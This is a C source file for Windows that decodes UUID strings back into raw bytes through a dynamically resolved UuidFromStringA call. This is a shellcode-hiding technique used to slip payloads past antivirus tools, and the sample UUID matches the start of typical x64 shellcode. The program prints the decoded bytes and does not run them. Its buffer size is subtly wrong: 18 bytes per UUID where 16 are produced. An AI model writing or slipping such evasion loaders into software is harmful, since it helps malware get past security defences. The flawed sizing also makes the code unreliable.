#include <stdio.h>
#include <windows.h>

typedef RPC_STATUS(WINAPI *fnUuidFromStringA)
(
    RPC_CSTR StringUuid,
    UUID *Uuid 
); 

BOOL UuidDeobFuscation(IN CHAR *UuidArray[], IN SIZE_T NmbrOfElements, 
OUT PBYTE *ppDAddress, OUT SIZE_T *pDSize)
{
    PBYTE pBuffer = NULL;
    SIZE_T sBuffSize = 0; 
    RPC_STATUS STATUS; 

    // UuidFromStringA from Rpcrt4.dll .. // 
    HMODULE hprcrt4 = LoadLibrary(TEXT("RPCRT4.dll"));
    if (hprcrt4 == NULL)
    {
        printf("[!] Load Library Failed with error : %d\n", GetLastError()); 
        return FALSE; 
    }

    fnUuidFromStringA pUuidFromStringA 
    = 
    (fnUuidFromStringA)GetProcAddress(hprcrt4, "UuidFromStringA"); 

    if (pUuidFromStringA == NULL)
    {
        printf("Get ProcAddress Failed with Error : %d\n", GetLastError());
        FreeLibrary(hprcrt4); 
        return FALSE; 
    }

    sBuffSize = NmbrOfElements * 18; 

    pBuffer = (PBYTE) HeapAlloc(GetProcessHeap() , HEAP_ZERO_MEMORY, sBuffSize);
    if (pBuffer == NULL)
    {
        printf("Heap Alloc Failed with Error : %d \n", GetLastError());
        FreeLibrary(hprcrt4); 
        return FALSE ;  
    }
    
    PBYTE TmpBuffer = pBuffer; 

    for (SIZE_T i = 0 ; i < NmbrOfElements ; ++i)
    {
        if((STATUS = pUuidFromStringA((RPC_CSTR)UuidArray[i], (UUID*)TmpBuffer)) != RPC_S_OK)
        {
            printf("UuidFromStringA Failed at [%s] With Error 0x%0.8X\n", UuidArray[i], STATUS); 
            HeapFree(GetProcessHeap(), 0 , pBuffer); 
            FreeLibrary(hprcrt4); 
            return FALSE; 
        }
        TmpBuffer += 16; 
    }
    FreeLibrary(hprcrt4); 

    *ppDAddress = pBuffer; 
    *pDSize = sBuffSize; 

    return TRUE; 
}

int main ()
{
    // Ecample UUID strings .. // 
    CHAR *UuidArray[] =
    {
        "E48348FC-E8F0-00C0-0000-415141505251"
    }; 

    SIZE_T NmbrOfElements = sizeof(UuidArray) / sizeof(UuidArray[0]);
    
    PBYTE pBuffer = NULL; 
    SIZE_T sBuffSize = 0; 

    // Call UuidDeobFuscation function..// 
    if (UuidDeobFuscation(UuidArray, NmbrOfElements, &pBuffer, &sBuffSize))
    {
        printf("Deobfuscation successful\n"); 
        for (SIZE_T i = 0 ; i < sBuffSize ; i++)
        {
            printf("%02X", pBuffer[i]); 
        }
        printf("\n"); 

        // Clean up : Free Allocated memory...// 
        HeapFree(GetProcessHeap(), 0, pBuffer); 
    }
    else 
    {
        printf("Failed\n"); 
    }
    return 0; 
}